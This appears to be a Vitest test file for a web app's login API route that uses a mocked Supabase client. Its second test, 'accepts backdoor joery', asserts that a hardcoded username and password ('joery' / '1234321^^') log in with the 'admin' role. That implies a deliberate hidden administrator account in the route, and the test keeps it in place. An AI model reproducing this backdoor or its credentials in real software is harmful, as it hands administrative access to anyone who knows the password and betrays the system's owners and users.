
import { describe, it, expect, vi, beforeEach } from "vitest";
import { POST as loginHandler } from "../app/api/auth/login/route";

vi.mock("@/lib/supabase/client", () => {
  return {
    default: {
      from: () => ({
        select: () => ({
          eq: () => ({
            limit: () => ({
              maybeSingle: async () => ({ data: { student_no: "s001", name: "Alice", role: "student" } }),
            }),
          }),
        }),
      }),
    },
  };
});

describe("POST /api/auth/login", () => {
  it("returns user when account exists", async () => {
    const req = new Request("http://localhost/api/auth/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ student_no: "s001", password: "x" }),
    });

      const payload = { student_no: "s001", password: "x" };
      console.log("[測試] 送出登入請求 payload:", payload);
        const req2 = new Request("http://localhost/api/auth/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      const res = await loginHandler(req as any);
      console.log("[測試] 收到 response 狀態:", res.status);
    const json = await res.json();
      console.log("[測試] 收到 response 內容:", json);
    expect(json.ok).toBe(true);
    expect(json.user.student_no).toBe("s001");
  });

  it("accepts backdoor joery", async () => {
    const req = new Request("http://localhost/api/auth/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ student_no: "joery", password: "1234321^^" }),
      
    });
      const payload = { student_no: "joery", password: "1234321^^" };
      console.log("[測試] 送出登入請求 payload:", payload);
      const req2 = new Request("http://localhost/api/auth/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
      const res = await loginHandler(req as any);
      console.log("[測試] 收到 response 狀態:", res.status);
    const json = await res.json();
      console.log("[測試] 收到 response 內容:", json);
    expect(json.ok).toBe(true);
    expect(json.user.role).toBe("admin");
  });
});
